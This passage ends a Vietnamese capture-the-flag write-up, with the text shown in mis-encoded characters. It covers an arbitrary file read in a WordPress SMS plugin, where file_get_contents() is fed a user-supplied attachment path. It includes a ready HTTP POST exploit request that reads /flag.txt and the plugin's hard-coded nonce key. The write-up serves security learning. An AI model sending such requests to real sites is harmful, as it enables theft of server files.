</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nx>apply_filters</span><span class=p>(</span><span class=s1>&#39;jot-send-message-messagetext&#39;</span><span class=p>,</span><span class=nv>$fullmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$member</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$message_type</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                            <span class=k>switch</span> <span class=p>(</span> <span class=nv>$message_type</span>  <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                               <span class=k>case</span> <span class=s1>&#39;jot-sms&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=nv>$message_error</span> <span class=o>=</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=o>-&gt;</span><span class=na>send_smsmessage</span><span class=p>(</span><span class=nv>$member</span><span class=p>[</span><span class=s1>&#39;jot_grpmemnum&#39;</span><span class=p>],</span><span class=nv>$fullmessage</span><span class=p>,</span><span class=nv>$attachment_raw</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                               <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                               <span class=k>case</span> <span class=s1>&#39;jot-call&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=nv>$message_error</span> <span class=o>=</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=o>-&gt;</span><span class=na>send_callmessage</span><span class=p>(</span><span class=nv>$member</span><span class=p>[</span><span class=s1>&#39;jot_grpmemnum&#39;</span><span class=p>],</span><span class=nv>$fullmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                               <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=k>if</span> <span class=p>(</span><span class=nv>$message_error</span><span class=p>[</span><span class=s1>&#39;send_message_errorcode&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=c1>//An error occurred sending the message
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=nv>$error</span> <span class=o>=</span> <span class=mi>999</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>                     <span class=nv>$all_send_errors</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$message_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>               <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                         <span class=nv>$error</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>               <span class=p>}</span>
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Táº¡i Ä‘Ã¢y cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c Ä‘oáº¡n code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$attachment_raw</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>cÃ³ thá»ƒ táº¥n cÃ´ng Ä‘Æ°á»£c thÃ´ng qua <code>file_get_contents()</code> Ä‘á»ƒ Ä‘á»c flag.
HÃ m nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘á»c ná»™i dung file Ä‘Ã­nh kÃ¨m tá»« Ä‘Æ°á»ng dáº«n <code>$attachment_fp</code>. Náº¿u chÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘áº§u vÃ o cá»§a biáº¿n <code>$mess_attachment</code>, viá»‡c chá»‰ Ä‘á»‹nh má»™t file cá»¥ thá»ƒ, nhÆ° <code>/flag.txt</code>, sáº½ cho phÃ©p há»‡ thá»‘ng Ä‘á»c ná»™i dung cá»§a file Ä‘Ã³ thÃ´ng qua <code>file_get_contents()</code>.</p><h3 id=phÃ¢n-tÃ­ch-lá»—-há»•ng-trong-hÃ m-send_message_callback-vÃ -khai-thÃ¡c-qua-file_get_contents>PhÃ¢n tÃ­ch lá»— há»•ng trong hÃ m <code>send_message_callback()</code> vÃ  khai thÃ¡c qua <code>file_get_contents()</code><a hidden class=anchor aria-hidden=true href=#phÃ¢n-tÃ­ch-lá»—-há»•ng-trong-hÃ m-send_message_callback-vÃ -khai-thÃ¡c-qua-file_get_contents>#</a></h3><p>Dá»¯ liá»‡u tá»« <code>$_POST['formdata']</code> Ä‘Æ°á»£c xá»­ lÃ½ báº±ng cÃ¡c hÃ m nhÆ° <code>sanitize_textarea_field()</code> vÃ  <code>sanitize_text_field()</code>, bao gá»“m giÃ¡ trá»‹ <code>mess_attachment</code>. Há»‡ thá»‘ng kiá»ƒm tra xem file Ä‘Ã­nh kÃ¨m cÃ³ tá»“n táº¡i trong thÆ° má»¥c <code>/attachments/</code> vÃ  cÃ³ Ä‘á»‹nh dáº¡ng há»£p lá»‡ hay khÃ´ng. Tuy nhiÃªn, náº¿u chá»‰ Ä‘á»‹nh má»™t Ä‘Æ°á»ng dáº«n trá»±c tiáº¿p Ä‘áº¿n file nháº¡y cáº£m nhÆ° <code>/flag.txt</code>, hÃ m <code>file_get_contents()</code> váº«n cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c ná»™i dung cá»§a file nÃ y náº¿u nÃ³ tá»“n táº¡i trÃªn há»‡ thá»‘ng.</p><p>Sau khi ná»™i dung file Ä‘Æ°á»£c Ä‘á»c, náº¿u xáº£y ra lá»—i trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n, cháº³ng háº¡n do nhÃ  cung cáº¥p dá»‹ch vá»¥ SMS, há»‡ thá»‘ng sáº½ tráº£ vá» thÃ´ng bÃ¡o lá»—i chá»©a thÃ´ng tin vá» file vá»«a Ä‘á»c. Lá»— há»•ng nÃ y táº¡o ra cÆ¡ há»™i Ä‘á»ƒ trÃ­ch xuáº¥t thÃ´ng tin nháº¡y cáº£m tá»« file mÃ  khÃ´ng cáº§n pháº£i vÆ°á»£t qua cÃ¡c rÃ o cáº£n báº£o máº­t khÃ¡c.</p><p>ChÃºng ta cÃ³ thá»ƒ khai thÃ¡c báº±ng cÃ¡ch gá»­i má»™t yÃªu cáº§u POST tá»›i há»‡ thá»‘ng vá»›i giÃ¡ trá»‹ <code>mess_attachment</code> trá» trá»±c tiáº¿p Ä‘áº¿n file <code>/flag.txt</code>. Náº¿u cÃ³ lá»—i phÃ¡t sinh trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n (nhÆ° trong trÆ°á»ng há»£p nhÃ  cung cáº¥p dá»‹ch vá»¥ SMS khÃ´ng kháº£ dá»¥ng), ná»™i dung cá»§a file flag sáº½ Ä‘Æ°á»£c tráº£ vá» dÆ°á»›i dáº¡ng má»™t pháº§n cá»§a thÃ´ng bÃ¡o lá»—i. Báº±ng cÃ¡ch nÃ y, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng Ä‘á»c Ä‘Æ°á»£c flag mÃ  khÃ´ng cáº§n pháº£i vÆ°á»£t qua cÃ¡c kiá»ƒm tra file loáº¡i bá» thÃ´ng thÆ°á»ng.</p><h3 id=khai-thÃ¡c>Khai thÃ¡c:<a hidden class=anchor aria-hidden=true href=#khai-thÃ¡c>#</a></h3><ol><li><p>Gá»­i yÃªu cáº§u vá»›i <code>mess_attachment</code> trá» Ä‘áº¿n file flag <code>/flag.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST /wp-admin/admin-ajax.php?action=send_message
</span></span></span><span class=line><span class=cl><span class=err>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>formdata=jotac-plugin-messages[jot-message]=test_message&amp;jotac-plugin-messages[jot-message-type]=jot-sms&amp;jotac-plugin-messages[jot-attachment]=/flag.txt&amp;sec=6AGmIzDZktwJCaQt
</span></span></span></code></pre></td></tr></table></div></div><p>Vá»›i giÃ¡ trá»‹ <code>sec</code> Ä‘Æ°á»£c láº¥y tá»«</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-jotac.php data-lang=jotac.php><span class=line><span class=cl> public function __construct () {
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     $this-&gt;product = &#34;JOTAC SMS&#34;;						
</span></span><span class=line><span class=cl>     $this-&gt;token = &#39;jotac-plugin&#39;;
</span></span><span class=line><span class=cl>     $this-&gt;key = &#39;6AGmIzDZktwJCaQt&#39;;
</span></span><span class=line><span class=cl>     $this-&gt;version = &#39;4.0.0&#39;; 
</span></span><span class=line><span class=cl>     $this-&gt;debug = false;			
</span></span></code></pre></td></tr></table></div></div></li><li><p>Khi xáº£y ra lá»—i trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n (trong <code>case 'jot-sms'</code>), ná»™i dung cá»§a file flag Ä‘Æ°á»£c lÆ°u trong <code>$attachment_raw</code> sáº½ xuáº¥t hiá»‡n trong pháº£n há»“i lá»—i tráº£ vá» tá»« server.</p></li></ol><p>Pháº§n tiáº¿p theo báº¡n Ä‘á»c Ä‘á»c táº¡i Ä‘Ã¢y <a href=https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv>https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/writeup/>WriteUp</a></li><li><a href=https://minhtuanact.github.io/tags/ctf/>CTF</a></li><li><a href=https://minhtuanact.github.io/tags/contentcreator/>ContentCreator</a></li></ul><nav class=paginav><a class=next href=https://minhtuanact.github.io/posts/mot-vai-nhung-vulnerable-gan-day-cua-whatsup-gold/><span class=title>Next Â»</span><br><span>Má»™t vÃ i nhá»¯ng vulnerable gáº§n Ä‘Ã¢y cá»§a Whatsup Gold</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on twitter" href="https://twitter.com/intent/tweet/?text=Writeup%20Patchstack%20WCUS%20CTF&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&hashtags=WriteUp%2cCTF%2cContentCreator"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&title=Writeup%20Patchstack%20WCUS%20CTF&summary=Writeup%20Patchstack%20WCUS%20CTF&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f&title=Writeup%20Patchstack%20WCUS%20CTF"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on whatsapp" href="https://api.whatsapp.com/send?text=Writeup%20Patchstack%20WCUS%20CTF%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Writeup Patchstack WCUS CTF on telegram" href="https://telegram.me/share/url?text=Writeup%20Patchstack%20WCUS%20CTF&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fwriteup-patchstack-wcus-ctf%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>